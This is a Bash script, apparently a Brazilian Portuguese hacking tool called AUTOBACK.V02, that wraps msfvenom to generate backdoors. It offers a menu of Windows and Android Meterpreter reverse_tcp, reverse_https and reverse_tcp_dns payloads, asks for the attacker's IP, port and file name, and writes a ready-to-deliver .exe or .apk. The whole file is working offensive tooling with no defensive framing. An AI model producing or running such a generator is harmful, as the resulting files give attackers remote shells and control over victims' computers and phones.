#!/bin/bash

echo "░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗"
echo "██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝"
echo "███████║██║░░░██║░░░██║░░░██║░░██║██████╦╝███████║██║░░╚═╝█████═╝░"
echo "██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔══██╗██╔══██║██║░░██╗██╔═██╗░"
echo "██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██████╦╝██║░░██║╚█████╔╝██║░╚██╗"
echo "╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝"

echo "▒▒▒▒▒▐▀▀▀█▄▒▒▒▒▒▒▒▒▒"
echo "▒▒▒▒█▀─────█▒▒▒▒▒▒▒▒"
echo "▒▒▒█────▄─▄─▌▒▒▒▒▒▒▒"
echo "▒▒▒▌───██─█▌▌▒▒▒▒▒▒▒"
echo "▒▒▒▌───█▌──▌▌▒▒▒▒▒▒▒"
echo "▒▒▒▌────────▌▒▒▒▒▒▒▒"
echo "▒▒█─────────▐▒▒▒▒▒▒▒"
echo "▒▐▌─▐───────▐▄▄▒▒▒▒▒"
echo "▒▐▌─▐────────▄▀▀█▒▒▒"
echo "▒█──▀▄──▄█▄▀▀▒▒▒▌▀▄▒" "Coded By Kira"
echo "▐▌────██▀█░█▄▒▄▄█▀▀▌" "github: https://github.com/KiraSec/"
echo "▐▌──▌▐───▐░░▐▀░░░░░▌" "AUTOBACK.V02"
echo "▐▌──▌────▐░░▐░░░░░░▌"
echo "▐───▌────▐░░▐░░░░░░▌"
echo "▐───█────▐░░▐░░░░░░▌"
echo "▐───█────▐░░▐░░░░░░▌"
echo "▐───█─────▀█▐▄▄▄█▀▀▒"
echo "▀▄▄─▐───────▄█▒▒▒▒▒▒"
echo "▒▒▒▀█───█▄▀▀▀▒▒▒▒▒▒▒"
echo "▒▒▒▒▒▀▀▀▒▒▒▒▒▒▒▒▒▒▒▒"


sleep 0.4

msfvenom="/usr/share/metasploit-framework"
if [ -e $msfvenom ]
	then
		echo "Metasploit encontrado, Continuando..."
	else
		echo "Metasploit não encontrado, Adeus" ; exit 0
fi


echo "|===============GERADOR DE BACKDOOR===============|"
echo "|                                                 |"
echo "| [1] windows/meterpreter/reverse_tcp             |"
echo "|                                                 |"
echo "| [2] windows/meterpreter/reverse_https           |"
echo "| [3] windows/meterpreter/reverse_tcp_dns         |"
echo "|                                                 |"
echo "|===============BACKDOOR ANDROID.sh===============|"
echo "|                                                 |"
echo "| [4] android/meterpreter/reverse_tcp             |"
echo "|                                                 |"
echo "| [5] android/meterpreter/reverse_https           |"
echo "|                                                 |"
echo "|=================================================|"

echo
echo
echo -n "Digite qual opção você deseja: " && read payload
if [ $payload -lt 1 ]
	then
		echo "Payload não encontrado, escolha outra opção!" ; exit
elif [ $payload -gt 5 ]
	then
		echo "Payload não encontrado, escolha outra opção!" ; exit 0
fi

echo
echo -n "Digite o ip interno ou externo: " && read ip
echo -n "Digite a porta que ira utilizar, Recomendado 4444: " && read porta 
echo -n "Digite o nome da sua backdoor, OBS= SEM O .EXE ou .APK: " && read arquivo

if [ $payload -eq 1 ]
	then
	cd Desktop
	echo "CRIANDO BACKDOOR....." ; msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f exe > $arquivo.exe 2>/dev/null
	payload="windows/meterpreter/reverse_tcp"
elif [ $payload -eq 2 ]
	then
	cd Desktop
	echo "CRIANDO BACKDOOR....." ; msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$porta -f exe > $arquivo.exe 2>/dev/null
	payload="msfvenom/meterpreter/reverse_https"
elif [ $payload -eq 3 ]
	then
	cd Desktop
	echo "CRIANDO BACKDOOR....." ; msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$porta -f exe > $arquivo.exe 2>/dev/null
	payload="windows/meterpreter/reverse_tcp_dns"
elif [ $payload -eq 4 ]
	then
	cd Desktop
	echo "CRIANDO BACKDOOR....." ; msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta R > $arquivo.apk 2>/dev/null
	payload="android/meterpreter/reverse_tcp"
elif [ $payload -eq 5 ]
	then
	cd Desktop
	echo "CRIANDO BACKDOOR....." ; msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$porta R > $arquivo.apk 2>/dev/null
	payload="android/meterpreter/reverse_https"
fi

echo
echo
echo
echo "BACKDOOR ESCOLHIDO CRIADO COM SUCESSO, VOLTE SEMPRE!" ; exit 0
sleep 0.5


